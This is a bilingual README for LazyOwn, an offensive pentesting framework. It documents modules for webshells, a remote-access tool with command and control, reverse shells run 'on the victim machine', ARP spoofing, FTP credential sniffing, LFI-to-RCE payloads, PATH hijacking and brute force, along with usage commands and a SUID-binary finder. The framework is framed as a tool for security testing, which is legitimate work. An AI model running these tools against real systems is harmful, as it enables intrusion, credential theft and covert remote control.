# LazyOwn

![Python](https://img.shields.io/badge/python-3670A0?style=for-the-badge&logo=python&logoColor=ffdd54) ![Shell Script](https://img.shields.io/badge/shell_script-%23121011.svg?style=for-the-badge&logo=gnu-bash&logoColor=white) ![image](https://github.com/user-attachments/assets/961783c2-cd57-4cc2-ab4c-53fde581db79)
 ![image](https://github.com/user-attachments/assets/79052f87-f87c-4b32-a4a2-854113ca3a4c)
  [![License: GPL v3](https://img.shields.io/badge/License-GPLv3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0) ![image](https://github.com/user-attachments/assets/b69f1d31-c075-4713-a44e-a40a034a7407) ![image](https://github.com/user-attachments/assets/df82a669-be0c-4a03-bd98-842a67baaef6)

![lazyown](https://github.com/user-attachments/assets/7682df7e-dafb-4136-adea-a7d3ef972445)


```sh
██╗      █████╗ ███████╗██╗   ██╗ ██████╗ ██╗    ██╗███╗   ██╗
██║     ██╔══██╗╚══███╔╝╚██╗ ██╔╝██╔═══██╗██║    ██║████╗  ██║
██║     ███████║  ███╔╝  ╚████╔╝ ██║   ██║██║ █╗ ██║██╔██╗ ██║
██║     ██╔══██║ ███╔╝    ╚██╔╝  ██║   ██║██║███╗██║██║╚██╗██║
███████╗██║  ██║███████╗   ██║   ╚██████╔╝╚███╔███╔╝██║ ╚████║
╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝    ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═══╝
```

[![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/Y8Y2Z73AV)

![LazyOwn1](https://github.com/user-attachments/assets/1debaed0-8f84-4079-ad2f-48cc4cfd9d95)

[*] TESTED ON ParrotSec 6.9.7

![image](https://github.com/user-attachments/assets/3234450f-dd5e-40e2-bcd8-f209ab0c4665)

# LazyOwn Framework

The LazyOwn Framework is a comprehensive and advanced toolkit designed for professional penetration testers and security researchers. Crafted for both Linux and Windows environments, this framework integrates a wide array of functionalities to streamline and enhance the efficiency of security assessments.

# Key Features:

Interactive Shell: Offers a powerful command-line interface for executing various security operations, featuring an intuitive command set for vulnerability scanning, binary analysis, and network operations.

Automation of Common Tasks: Automates repetitive tasks such as scanning, fuzzing, and brute-force attacks, significantly reducing manual effort and increasing productivity.

Integration with Popular Tools: Seamlessly integrates with industry-standard tools and frameworks like Metasploit, Nmap, and Gobuster, allowing for a cohesive workflow and enhanced functionality.

Custom Scripts and Modules: Includes custom-developed scripts and modules tailored for specialized tasks, such as automated exploit setup and dynamic payload handling.

Cross-Platform Compatibility: Supports both Parrot OS and Windows environments, ensuring versatility and adaptability across different systems.

Enhanced Security Features: Incorporates advanced security mechanisms to safeguard the integrity of the framework and protect sensitive information during assessments.

# Applications:

Vulnerability Assessment: Efficiently identify and analyze vulnerabilities within systems and applications.

Binary Analysis: Conduct detailed analysis of binary files to uncover potential security weaknesses and exploits.

Network Security Testing: Perform comprehensive network assessments, including scanning and enumeration of services and vulnerabilities.

# Objective:

The primary objective of the LazyOwn Framework is to provide a robust, user-friendly toolset for ethical hackers and security professionals, enabling them to conduct thorough and effective security assessments with greater efficiency. By automating routine tasks and integrating with leading security tools, the framework empowers users to focus on critical analysis and strategic decision-making.

<https://www.reddit.com/r/LazyOwn/>

<https://github.com/grisuno/LazyOwn/assets/1097185/eec9dbcc-88cb-4e47-924d-6dce2d42f79a>

Discover LazyOwn, the ultimate solution for automating the search and analysis of binaries with special permissions on both Linux and Windows systems. Our powerful tool simplifies pentesting, making it more efficient and effective. Watch this video to learn how LazyOwn can streamline your security assessments and enhance your cybersecurity toolkit.

```sh
LazyOwn> set target_ip 192.168.1.1
[SET] target_ip set to 192.168.1.1
LazyOwn> run lazynmap
[INFO] Running Nmap scan on 192.168.1.1
...
```

![image](https://github.com/grisuno/LazyOwn/assets/1097185/9f30a1a3-dfe8-4cc1-9bd7-76c21bdc64b7)

LazyOwn es ideal para profesionales de la ciberseguridad que buscan una solución centralizada y automatizada para sus necesidades de pentesting, ahorrando tiempo y mejorando la eficiencia en la identificación y explotación de vulnerabilidades.

![Captura de pantalla 2024-05-22 021136](https://github.com/grisuno/LazyOwn/assets/1097185/9a348e76-d667-4526-bdef-863159ba452d)

## Requisitos

- Python 3.x
- Módulos de Python:
  - python-libnmap
  - pwn
  - groq
  - PyPDF2
  - docx
  - python-docx
  - olefile
  - exifread
  - pycryptodome
  - impacket
  - pandas
  - colorama
  - tabulate
  - pyarrow
  - keyboard
  - flask-unsign
  - name-that-hash
- `subprocess` (incluido en la biblioteca estándar de Python)
- `platform` (incluido en la biblioteca estándar de Python)
- `tkinter` (Opcional para el GUI)
- `numpy` (Opcional para el GUI)
-

## Instalación

1. Clona el repositorio:

```sh
git clone https://github.com/grisuno/LazyOwn.git
cd LazyOwn
```

2. Instala las dependencias de Python:

```sh
./install.sh
```

## Uso

```sh
./run or ./fast_run_as_r00t.sh 
```

```
Use set <parameter> <value> to set parameters.
Use show to display current parameter values.
Use run <script_name> to execute a script with the set parameters.
Use exit to exit the CLI.
Una vez que el shell esté en funcionamiento, puedes utilizar los siguientes comandos:

list: Lista todos los Modulos de LazyOwn
set <parámetro> <valor>: Establece el valor de un parámetro. Por ejemplo, set target_ip 192.168.1.1.
show: Muestra los valores actuales de todos los parámetros.
run <script>: Ejecuta un script específico disponible en el framework.
Scripts disponibles

LazyOwn> ls
    [+] Available scripts to run: [👽]
lazysearch                lazysearch_gui            lazyown
update_db                 lazynmap                  lazyaslrcheck
lazynmapdiscovery         lazygptcli                lazyburpfuzzer
lazymetaextract0r         lazyreverse_shell         lazyattack
lazyownratcli             lazyownrat                lazygath
lazysniff                 lazynetbios               lazybotnet
lazybotcli                lazyhoneypot              lazysearch_bot
lazylfi2rce               lazylogpoisoning          lazymsfvenom
lazypathhijacking         lazyarpspoofing           lazyftpsniff
lazyssh77enum             lazywerkzeugdebug
LazyOwn> ?

Documented commands (type help <topic>):
========================================
acknowledgearp     dirsearch           lazywebshell     rpcdump
acknowledgeicmp    dnsenum             ldapdomaindump   rubeus
addhosts           dnsmap              list             run
alias              download_exploit    msf              samrdump
arpscan            download_resources  nbtscan          set
asprevbase64       encrypt             nc               sh
banner             enum4linux          nikto            show
bloodhound         exit                nmapscripthelp   smbclient
chisel             fixel               openssl_sclient  smbmap
clean              fixperm             payload          smbserver
clock              getcap              ping             snmpcheck
cme                getnpusers          ports            socat
conptyshell        getseclist          proxy            sqlmap
cp                 gobuster            psexec           ss
cports             gospider            pwd              sshd
createcredentials  hashcat             py3ttyup         tcpdump_icmp
createhash         help                pyautomate       vpn
createrevshell     ignorearp           qa               wfuzz
createwebshell     ignoreicmp          responder        whatweb
createwinrevshell  ip                  rev              winbase64payload
decrypt            john2hash           rhost            wrapper
dig                lazypwn             rpcclient        www



```
## Tag en youtube
<https://www.youtube.com/hashtag/lazyown>


```sh
LazyOwn> set binary_name my_binary
LazyOwn> set target_ip 192.168.1.100
LazyOwn> set api_key my_api_key
LazyOwn> run lazysearch
LazyOwn> run lazynmap
LazyOwn> exit
```

![image](https://github.com/grisuno/LazyOwn/assets/1097185/6c8a0b35-cde5-42b3-be73-eb45b3f821f0)

para las busquedas

```sh
python3 lazysearch.py binario_a_buscar
```

## Busquedas con GUI

Características adicionales y cambios:
AutocompleteEntry:

Se ha agregado un filtro para eliminar valores None de la lista de autocompletar.
Nuevo Vector de Ataque:

Añadido un botón "Nuevo Vector de Ataque" en la interfaz principal.
Implementada la funcionalidad para agregar un nuevo vector de ataque y guardar los datos actualizados en los archivos Parquet.
Exportar a CSV:

Añadido un botón "Exportar a CSV" en la interfaz principal.
Implementada la funcionalidad para exportar los datos del DataFrame a un archivo CSV seleccionado por el usuario.
Uso:
Agregar un nuevo vector de ataque: Hacer clic en el botón "Nuevo Vector de Ataque", llenar los campos y guardar.
Exportar a CSV: Hacer clic en el botón "Exportar a CSV" y seleccionar la ubicación para guardar el archivo CSV.

Nueva Función scan_system_for_binaries:

Implementa la búsqueda de binarios en el sistema utilizando el comando file para determinar si un archivo es binario.
Se utiliza os.walk para recorrer el sistema de archivos.
Los resultados se muestran en una nueva ventana de la GUI.
Botón para Buscar Binarios:

Se ha añadido un botón "Buscar Binarios en el Sistema" en la interfaz principal que llama a la función scan_system_for_binaries.
Nota:
La función is_binary utiliza el comando file de Unix para determinar si un archivo es un ejecutable binario. Si estás en un sistema operativo diferente, necesitarás ajustar este método para que sea compatible.
Esta implementación puede ser intensiva en recursos, ya que recorre todo el sistema de archivos. Podrías añadir opciones adicionales para limitar la búsqueda a directorios específicos o añadir un filtro para ciertos tipos de archivos.

```sh
python3 LazyOwnExplorer.py
```

![image](https://github.com/grisuno/LazyOwn/assets/1097185/87c4be70-66a4-4e84-bdb6-fdfdb89a3f94)

para ejecutar una busqueda contra la maquina a analizar

```sh
python3 lazyown.py
```

en el caso de querer actualizar hacemos

```sh
cd LazyOwn
rm *.csv
rm *.parquet
./update_db.sh
```

El proyecto consta de tres scripts principales:

1. search.py
Este script extrae información de binarios y sus funciones desde GTFOBins y la guarda en un archivo CSV. ya hice el scraping así que mejor evitar y usar la db que ya tiene en formato csv, a menos que quieran actualizar la db

```python
import requests
from bs4 import BeautifulSoup
import csv

# URL del servidor que contiene el HTML
url = "https://gtfobins.github.io/index.html"

# Hacer una solicitud GET al servidor
response = requests.get(url)

# Verificar si la solicitud fue exitosa
if response.status_code == 200:
    html_content = response.text
else:
    print("Error al obtener el HTML del servidor")
    exit()

# Parsear el contenido HTML con Beautiful Soup
soup = BeautifulSoup(html_content, 'html.parser')

# Encontrar el contenedor de la tabla
table_wrapper = soup.find('div', id='bin-table-wrapper')

# Inicializar una lista para almacenar la información
data = []

# Recorrer todas las filas de la tabla
for row in table_wrapper.find_all('tr'):
    bin_name = row.find('a', class_='bin-name')
    if bin_name:
        bin_name_text = bin_name.text.strip()
        functions = []
        for func in row.find_all('li'):
            function_link = func.find('a')
            if function_link:
                function_href = function_link.get('href').strip()
                function_name = function_link.text.strip()
                functions.append({'name': function_name, 'href': function_href})
        
        # Añadir la información a la lista de datos
        data.append({'binary': bin_name_text, 'functions': functions})

# Guardar la información en un archivo CSV
csv_file = "bin_data.csv"
with open(csv_file, mode='w', newline='') as file:
    writer = csv.writer(file)
    writer.writerow(['Binary', 'Function Name', 'Function URL'])
    for entry in data:
        binary = entry['binary']
        for func in entry['functions']:
            writer.writerow([binary, func['name'], func['href']])

print(f"Datos guardados en {csv_file}")

```

## 2. detailed_search.py

Este script lee el archivo CSV generado por scrape_bins.py, extrae detalles adicionales de cada función y guarda los datos en un segundo archivo CSV.

```python
import requests
from bs4 import BeautifulSoup
import csv
from urllib.parse import urljoin
import time
import os

# URL base del servidor
base_url = "https://gtfobins.github.io/"

# Nombre del archivo CSV de entrada
input_csv = "bin_data.csv"

# Nombre del archivo de salida CSV
output_csv = "bin_data_relevant.csv"

# Función para obtener la información relevante de una URL
def obtener_informacion(url):
    response = requests.get(url)
    if response.status_code != 200:
        print(f"Error al obtener la URL: {url}")
        return []
    
    soup = BeautifulSoup(response.text, 'html.parser')
    data = []

    for section in soup.find_all('h2', class_='function-name'):
        function_name = section.text.strip()
        function_id = section.get('id')
        function_url = f"{url}#{function_id}"
        description = section.find_next('p').text.strip() if section.find_next('p') else ""
        example = section.find_next('code').text.strip() if section.find_next('code') else ""

        data.append({
            "function_name": function_name,
            "function_url": function_url,
            "description": description,
            "example": example
        })

    return data

# Leer el archivo CSV de entrada
binarios_funciones = {}
with open(input_csv, mode='r', encoding='utf-8') as file:
    reader = csv.DictReader(file)
    for row in reader:
        binary = row['Binary']
        if binary not in binarios_funciones:
            binarios_funciones[binary] = row['Function URL'].split('#')[0]

# Verificar si ya existe un archivo de salida y hasta dónde se ha procesado
resume = False
if os.path.exists(output_csv):
    with open(output_csv, mode='r', encoding='utf-8') as file:
        reader = csv.reader(file)
        rows = list(reader)
        if len(rows) > 1:
            last_processed = rows[-1][2]
            resume = True

# Inicializar una lista para almacenar toda la información
informacion_binarios = []

# Abrir el archivo CSV para escritura
csv_file = open(output_csv, mode='w', newline='', encoding='utf-8')
csv_writer = csv.writer(csv_file)
csv_writer.writerow(['Binary', 'Function Name', 'Function URL', 'Description', 'Example'])

# Recorrer la lista de binarios y sus funciones
for binary, url in binarios_funciones.items():
    # Si estamos retomando desde un punto anterior, saltamos hasta el último URL procesado
    if resume:
        if url != last_processed:
            continue
        else:
            resume = False
    full_url = urljoin(base_url, url)
    
    informacion = obtener_informacion(full_url)
    for item in informacion:
        informacion_binarios.append({
            "binary": binary,
            "function_name": item["function_name"],
            "function_url": item["function_url"],
            "description": item["description"],
            "example": item["example"]
        })
        # Guardar la información en el archivo CSV
        csv_writer.writerow([binary, item['function_name'], item['function_url'], item['description'], item['example']])
        print(f"[+] Binary: {binary} {item['function_name']}")
    # Hacemos una pausa de 5 segundos entre cada solicitud de URL
    time.sleep(5)

# Cerrar el archivo CSV
csv_file.close()

print(f"Datos guardados en {output_csv}")

```

3. lazyown.py
Este script analiza los binarios en el sistema y genera opciones basadas en la información recopilada. Detecta si el sistema operativo es Linux o Windows y ejecuta el comando adecuado para buscar binarios con permisos elevados.

```python
import pandas as pd
import os
import subprocess
import platform

# Lee los CSVs y crea los DataFrames
df1 = pd.read_csv('bin_data.csv')
df2 = pd.read_csv('bin_data_relevant.csv')

# Guarda los DataFrames como Parquet
df1.to_parquet('binarios.parquet')
df2.to_parquet('detalles.parquet')

# Función para realizar la búsqueda y generar el CSV de salida
def buscar_binarios():
    binarios_encontrados = set()
    
    # Detecta el sistema operativo
    sistema_operativo = platform.system()
    
    if sistema_operativo == 'Linux':
        # Ejecuta el comando find para Linux
        result = subprocess.run(['find', '/', '-perm', '4000', '-ls'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        output = result.stdout
        
        # Extrae los binarios encontrados
        for line in output.split('\n'):
            if line:
                binario = os.path.basename(line.split()[-1])
                binarios_encontrados.add(binario)
    
    elif sistema_operativo == 'Windows':
        # Script de PowerShell para Windows
        powershell_script = """
        $directories = @("C:\\Windows\\System32", "C:\\", "C:\\Program Files", "C:\\Program Files (x86)")
        foreach ($dir in $directories) {
            Get-ChildItem -Path $dir -Recurse -Filter *.exe -ErrorAction SilentlyContinue | 
            ForEach-Object {
                $acl = Get-Acl $_.FullName
                $privileges = $acl.Access | Where-Object { $_.FileSystemRights -match "FullControl" }
                if ($privileges) {
                    Write-Output "$($_.FullName)"
                }
            }
        }
        """
        
        # Ejecuta el script de PowerShell
        result = subprocess.run(['powershell', '-Command', powershell_script], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        output = result.stdout
        
        # Extrae los binarios encontrados
        for line in output.split('\n'):
            if line:
                binario = os.path.basename(line.strip())
                binarios_encontrados.add(binario)
    
    # Filtra el DataFrame principal con los binarios encontrados
    df_binarios_encontrados = df1[df1['Binary'].isin(binarios_encontrados)]
    
    # Genera un CSV con los detalles de los binarios encontrados
    with open('resultado.csv', 'w') as f:
        for binario in binarios_encontrados:
            detalles = df2[df2['Binary'] == binario]
            if not detalles.empty:
                f.write(detalles.to_csv(index=False, header=False))
                print(detalles.to_csv(index=False, header=False))

# Función para ejecutar opciones basadas en los datos encontrados
def ejecutar_opciones():
    df_resultado = pd.read_csv('resultado.csv', header=None, names=['Binary', 'Function Name', 'Function URL', 'Description', 'Example'])
    
    for binario in df_resultado['Binary'].unique():
        print(f"Binario encontrado: {binario}")
        detalles = df_resultado[df_resultado['Binary'] == binario]

        print("Opciones:")
        for i, (_, row) in enumerate(detalles.iterrows(), start=1):
            print(f"{i}. {row['Function Name']} - {row['Description']}")
        print(f"{i+1}. No hacer nada y salir")
        
        while True:
            opcion = input("Seleccione una opción: ")
            if opcion.isdigit() and 1 <= int(opcion) <= len(detalles) + 1:
                break
            else:
                print("Opción no válida. Por favor, intente de nuevo.")
        
        opcion = int(opcion)
        
        if opcion <= len(detalles):
            print(f"Ejecutando opción {opcion} para {binario}")
            # Código para ejecutar la opción correspondiente
            print(f"Ejemplo de ejecución:\n{detalles.iloc[opcion-1]['Example']}")
            # Aquí puedes agregar el código para ejecutar el ejemplo si es necesario
        else:
            print("Saliendo")
            break

if __name__ == '__main__':
    buscar_binarios()
    ejecutar_opciones()

```

## Uso modo LazyOwn WebShells

LazyOwn Webshell Collection es una colleccion de webshells para nuestro framework, el cual nos permite mediante distintos lenguajes establecer una webshell en la maquina donde ejecutemos lazyown webshell basicamente lo que hace es levantar un servidor web dentro del directorio modules para que así esté visible mediante el navegador así podemos tanto disponivilizar los modulos por separados mediante web como tambien podemos acceder al directorio cgi-bin en donde hay 4 shells una bash otra en perl otra en python y en asp por
si fuera un windwos

```sh
lazywebshell
```

y listo ya podemos acceder a cualquiera de estas url:

<http://localhost:8080/cgi-bin/lazywebshell.sh>

<http://localhost:8080/cgi-bin/lazywebshell.py>

<http://localhost:8080/cgi-bin/lazywebshell.asp>

<http://localhost:8080/cgi-bin/lazywebshell.cgi>

![image](https://github.com/grisuno/LazyOwn/assets/1097185/fc0ea814-7044-4f8f-8979-02f9579e9df9)

## Uso Lazy MSFVenom para Reverse Shell

se crearán 3 archivos uno para windows uno para linux y uno para mac con el nombre shell.exe, shell.elf, shell.macho respectivamente y se invoca con el comando run lazymsfvenom

```sh
run lazymsfvenom
```

## Uso Lazy PATH Hijacking

se crearán un archivo en /tmp con el nombre de binary_name seteado en payload inicializado con gzip en memoria y como bash en payload parasetear el payload desde el json usar el comando payload para ejecutar usar:

```sh
lazypathhijacking
```

## Uso modo LazyOwn RAT

LazyOwn RAT es una sencilla pero potente Remote Admin Tool Cuenta con una funcion de Screenshot, el cual captura la pantalla del servidor, tiene un comando upload, el cual nos permite subir archivos a la maquina comprometida, y un modo C&C donde podran enviar comandos al servidor, cuenta con dos modos en modo cliente y modo servidor, no tiene ningun tipo de ofuscación y la rat me base en BasicRat acá su github <https://github.com/awesome-security/basicRAT> y en <https://github.com/hash3liZer/SillyRAT> aun que está ultima es mucho más completa yo solo queria sacar pantallasos subir archivos y enviar comandos, quizas más adelante agregar funcionalidad de mirar webcams, pero eso más adelante.

```sh
usage: lazyownserver.py [-h] [--host HOST] [--port PORT] --key KEY
lazyownserver.py: error: the following arguments are required: --key

usage: lazyownclient.py [-h] --host HOST --port PORT --key KEY
lazyownclient.py: error: the following arguments are required: --host, --port, --key

LazyOwn> run lazyownclient
[?] lhost and lport and rat_key must be set

LazyOwn> run lazyownserver
[?] rhost and lport and rat_key must be set

luego los comandos son:

upload /path/to/file
donwload /path/to/file
screenshot
sysinfo
fix_xauth #to fix xauth xD
lazyownreverse 192.168.1.100 8888 #Reverse shell to 192.168.1.100 on port 8888 ready to C&C
```

![image](https://github.com/grisuno/LazyOwn/assets/1097185/2bb7ec40-0d89-4ca6-87ff-2baa62781648)

## Uso modo Lazy Meta Extract0r

LazyMeta Extract0r es una herramienta diseñada para extraer metadata de varios tipos de archivos, incluidos PDF, DOCX, archivos OLE (como DOC y XLS), y varios formatos de imágenes (JPG, JPEG, TIFF). Esta herramienta recorrerá un directorio especificado, buscará archivos con extensiones compatibles, extraerá la metadata y la guardará en un archivo de salida.

[*] Iniciando: LazyMeta extract0r [;,;]

usage: lazyown_metaextract0r.py [-h] --path PATH
lazyown_metaextract0r.py: error: the following arguments are required: --path

```sh
python3 lazyown_metaextract0r.py --path /home/user
```

![image](https://github.com/grisuno/LazyOwn/assets/1097185/9ec77c01-4bc1-48ab-8c34-7457cff2f79f)

## Uso modo decrypt encrypt

un metodo de cifrado el cual nos permite tanto encryptar archivos como decencriptar los si se cuenta con la llave obviamente:

![Captura de pantalla 2024-06-08 231900](https://github.com/grisuno/LazyOwn/assets/1097185/15158dbd-6cd6-4e20-a237-6c89983d42ce)

```sh
encrypt path/to/file key # to encrypt
decrypt path/to/file.enc key #to decrypt
```

## Uso modo LazyNmap

El uso Lazynmap nos proporciona un script automatizado de un target en este caso 127.0.0.1 utilizando nmap el scipr requiere permisos de administración mediante sudo.
tambien tiene un modulo de net discovery para saber que hay en el segmento de ip en el que te encuentras.

![image](https://github.com/grisuno/LazyOwn/assets/1097185/48a38836-6cf5-4676-bea8-063e0b5cf7ad)

```sh
./lazynmap.sh -t 127.0.0.1 
```

## Uso modo Chat Generativo por Consola LazyOwn GPT One Liner CLI Assistant y researcher

¡Descubre la revolución en automatización de tareas de pentesting con el LazyOwn GPT One Liner CLI Assistant! Este increíble script forma parte de la suite de herramientas LazyOwn, diseñadas para hacer tu vida como pentester más eficiente y productiva.

🚀 Principales Características:

Automatización Inteligente: Utiliza la potencia de Groq y modelos avanzados de lenguaje natural para generar comandos precisos y eficientes basados en tus necesidades específicas.
Interfaz Amigable: Con un simple prompt, el asistente genera y ejecuta scripts de una línea, reduciendo drásticamente el tiempo y esfuerzo en la creación de comandos complejos.
Mejora Continua: Transforma y optimiza continuamente su base de conocimientos para proporcionarte las mejores soluciones, adaptándose a cada situación.
Depuración Simplificada: Habilita el modo debug para obtener información detallada de cada paso, facilitando la identificación y corrección de errores.
Integración Perfecta: Funciona sin problemas con tu entorno de trabajo, aprovechando el poder de la API de Groq para ofrecerte respuestas rápidas y precisas.

🔒 Seguridad y Control:

Manejo Seguro de Errores: Detecta y responde inteligentemente a errores de ejecución, asegurando que siempre tengas el control total de cada comando generado.
Ejecución Controlada: Antes de ejecutar cualquier comando, solicita tu confirmación, brindándote la tranquilidad de saber exactamente qué se está ejecutando en tu sistema.

🌐 Configuración Sencilla:

Configura tu API key en segundos y comienza a disfrutar de todas las ventajas que ofrece el LazyOwn GPT One Liner CLI Assistant.
La guía de inicio rápido está disponible para ayudarte a configurar y sacar el máximo provecho de esta poderosa herramienta.

🎯 Ideal para Pentesters y Desarrolladores:

Optimiza tus Procesos: Simplifica y acelera la generación de comandos en tus auditorías de seguridad.
Aprendizaje Continuo: La base de conocimientos se actualiza y mejora constantemente, proporcionándote siempre las mejores prácticas y soluciones más recientes.
Con el LazyOwn GPT One Liner CLI Assistant, transforma tu forma de trabajar, haciéndola más rápida, eficiente y segura. ¡No pierdas más tiempo en tareas repetitivas y complejas, y enfócate en lo que realmente importa: descubrir y solucionar vulnerabilidades!

¡Únete a la revolución del pentesting con LazyOwn y lleva tu productividad al siguiente nivel!

[?] Uso: python lazygptcli.py --prompt "<tu prompt>" [--debug]

[?] Opciones:
  --prompt    "El prompt para la tarea de programación (requerido)."
  --debug, -d "Habilita el modo debug para mostrar mensajes de depuración."
  --transform "Transforma la base de conocimientos original en una base mejorada usando Groq."

[?] Asegúrate de configurar tu API key antes de ejecutar el script:
  export GROQ_API_KEY=<tu_api_key>
[->] visit: <https://console.groq.com/docs/quickstart> not sponsored link

Requisitos:
Python 3.x
Una API key válida de Groq
Pasos para Obtener la API Key de Groq:
Visita Groq Console (<https://console.groq.com/docs/quickstart>) para registrarte y obtener una API key.

```sh
export GROQ_API_KEY=<tu_api_key>
python3 lazygptcli.py --prompt "<tu prompt>" [--debug]          
```

![image](https://github.com/grisuno/LazyOwn/assets/1097185/90a95c2a-48d3-4b02-8055-67656c1e71c9)

## Uso de modo lazyown_bprfuzzer.py

Proporcionar los argumentos según las solicitudes del script: El script solicitará los siguientes argumentos:
usage: lazyown_bprfuzzer.py [-h] --url URL [--method METHOD] [--headers HEADERS] [--params PARAMS] [--data DATA] [--json_data JSON_DATA]
                   [--proxy_port PROXY_PORT] [-w WORDLIST] [-hc HIDE_CODE]

lazyburp.py: error: the following arguments are required: --url
--url: La URL a la que se enviará la solicitud (obligatorio).
--method: El método HTTP a utilizar, como GET o POST (opcional, valor predeterminado: GET).
--headers: Los encabezados de la solicitud en formato JSON (opcional, valor predeterminado: {}).
--params: Los parámetros de la URL en formato JSON (opcional, valor predeterminado: {}).
--data: Los datos del formulario en formato JSON (opcional, valor predeterminado: {}).
--json_data: Los datos JSON para la solicitud en formato JSON (opcional, valor predeterminado: {}).
--proxy_port: El puerto del proxy interno (opcional, valor predeterminado: 8080).
-w, --wordlist: La ruta del diccionario para el modo de fuzzing (opcional).
-hc, --hide_code: El código de estado HTTP para ocultar en la salida (opcional).

```sh
python3 lazyown_bprfuzzer.py --url "http://example.com" --method POST --headers '{"Content-Type": "LAZYFUZZ"}'
```

Forma 2: Uso Avanzado
Si deseas aprovechar las características avanzadas del script, como el modo de repetición o fuzzing, sigue estos pasos:

Repetición de solicitudes:

Para utilizar la funcionalidad de repetición de solicitudes, proporciona los argumentos como se indicó anteriormente.
Durante la ejecución, el script preguntará si deseas repetir la solicitud. Ingresa 's' para repetir o 'n' para finalizar el repetidor.
Fuzzing:

Para usar la funcionalidad de fuzzing, asegúrate de proporcionar un diccionario de palabras con el argumento -w o --wordlist.
El script reemplazará la palabra LAZYFUZZ en la URL y otros datos con las palabras del diccionario proporcionado.
Durante la ejecución, el script mostrará los resultados de cada iteración de fuzzing.
Estas son las formas básicas y avanzadas de usar el script lazyburp.py. Dependiendo de tus necesidades, puedes elegir la forma que mejor se adapte a tu situación específica.

```sh
python3 lazyown_bprfuzzer.py \                                                                                                           ─╯
    --url "http://127.0.0.1:80/LAZYFUZZ" \
    --method POST \
    --headers '{"User-Agent": "LAZYFUZZ"}' \
    --params '{"param1": "value1", "param2": "LAZYFUZZ"}' \
    --data '{"key1": "LAZYFUZZ", "key2": "value2"}' \
    --json_data '{"key3": "LAZYFUZZ"}' \
    --proxy_port 8080 \
    -w /usr/share/seclist/SecLists-master/Discovery/Variables/awesome-environment-variable-names.txt \
    -hc 501
```

```sh
python3 lazyown_bprfuzzer.py \                                                                                                           ─╯
    --url "http://127.0.0.1:80/LAZYFUZZ" \
    --method POST \
    --headers '{"User-Agent": "LAZYFUZZ"}' \
    --params '{"param1": "value1", "param2": "LAZYFUZZ"}' \
    --data '{"key1": "LAZYFUZZ", "key2": "value2"}' \
    --json_data '{"key3": "LAZYFUZZ"}' \
    --proxy_port 8080 \
    -w /usr/share/seclist/SecLists-master/Discovery/Variables/awesome-environment-variable-names.txt \
 
```

![image](https://github.com/grisuno/LazyOwn/assets/1097185/dc66fdc2-cd7d-4b79-92c6-dd43d376ee0e)
PD: para usar el diccionario que utilizo realizar dentro de /usr/share/seclist el siguiente comando

```sh
wget -c https://github.com/danielmiessler/SecLists/archive/master.zip -O SecList.zip \
&& unzip SecList.zip \
&& rm -f SecList.zip
```

## Uso modo LazyOwn FTP Sniff

este modulo sirve para buscar claves en la red de servidores ftp, algunos me dirán que no se ya no se usa pero se sorprenderian en los entornos productivos en infraestructura critica que e visto maquinas con FTP's masivos corriendo en sus servidores :)

```sh
set device eth0
run lazyftpsniff
```

![image](https://github.com/grisuno/LazyOwn/assets/1097185/d2d1c680-fc03-4f60-adc4-20248f3e3859)

## Uso modo LazyReverseShell

primero nos ponemos en escucha con el comando

```sh
nc -nlvp 1337 #o el puerto que escojamos 
```

![image](https://github.com/grisuno/LazyOwn/assets/1097185/dfb7a81d-ac7f-4b8b-8f1f-717e058260b5)

para luego en la maquina victima

```sh
./lazyreverse_shell.sh --ip 127.0.0.1 --puerto 1337
```

![image](https://github.com/grisuno/LazyOwn/assets/1097185/b489be5d-0b53-4054-995f-6106c9c95190)

## Uso modo Lazy Curl to recon

el modulo está en modules y se usa así:

```sh
chmod +x lazycurl.sh
```

Ejecutar el script con los parámetros deseados. Por ejemplo:

```sh
./lazycurl.sh --mode GET --url http://10.10.10.10
```

Ejemplos de uso

Enviar una solicitud GET:

```sh
./lazycurl.sh --mode GET --url http://10.10.10.10
```

Enviar una solicitud POST:

```sh
./lazycurl.sh --mode POST --url http://10.10.10.10 --data "param1=value1&param2=value2"
```

Probar un método TRACE:

```sh
./lazycurl.sh --mode TRACE --url http://10.10.10.10
```sh

Subir un archivo:

```sh
./lazycurl.sh --mode UPLOAD --url http://10.10.10.10 --file file.txt
```

Realizar fuerza bruta con una wordlist:

```sh
./lazycurl.sh --mode BRUTE_FORCE --url http://10.10.10.10 --wordlist /usr/share/wordlists/rockyou.txt
```

Asegúrate de ajustar los parámetros según tus necesidades y de que los valores que pases a las opciones sean válidos para cada caso.

## Uso modo ARPSpoofing

el script provee de un ataque de ARPSpoofing mediante scapy en el payload debe ser seteado el lhost rhost y el device que pondràs a arpspoofear

```sh
set rhost 192.168.1.100
set lhost 192.168.1.1
set device eth0
run lazyarpspoofing
```

## Uso modo LazyGathering

script que nos provee una visión de rayos x en cuanto al sistema en cuestion donde estamos ejecutando la herramiente

![image](https://github.com/grisuno/LazyOwn/assets/1097185/6d1416f9-10cd-4316-8a62-92c3f10082e0)

```sh
run lazygath
```

## Uso modo Lazy Own Lfi Rfi 2 Rce

El modo Lfi Rfi 2 Rce es par aprobar algunos payloads más conocidos a los parametros de payload.json

![image](https://github.com/grisuno/LazyOwn/assets/1097185/4259a469-8c8e-4d11-8db5-39a3bf15059c)

```sh
payload
run lazylfi2rce
```

## Uso modo LazyOwn Sniffer

<https://www.youtube.com/watch?v=_-DDiiMrIlE>

El modo sniffer nos permite capturar el trafico de red por interfaces con la opcion -i que es la opción obligatoria, dentro de muchas tras opciones no obligatorias,
usage: lazysniff.py [-h] -i INTERFACE [-c COUNT] [-f FILTER] [-p PCAP]
lazysniff.py: error: the following arguments are required: -i/--interface

![Captura de pantalla 2024-06-05 031231](https://github.com/grisuno/LazyOwn/assets/1097185/db1e05a0-026e-414f-9ec6-0a9ef2cb06fe)

usando desde el framework se debe setear device con set device [eth0, wla0,eth1, wlan1, etc] segun sea su interface y luego:

```sh
run lazysniff
```

## Uso modo LazyAtack

Este script de pentesting en Bash permite ejecutar una serie de pruebas de seguridad en modo servidor (máquina víctima) o en modo cliente (máquina atacante). Dependiendo del modo seleccionado, ofrece diferentes opciones y funcionalidades para llevar a cabo diversas acciones de prueba de penetración.

Opciones del Script
Modo Servidor:

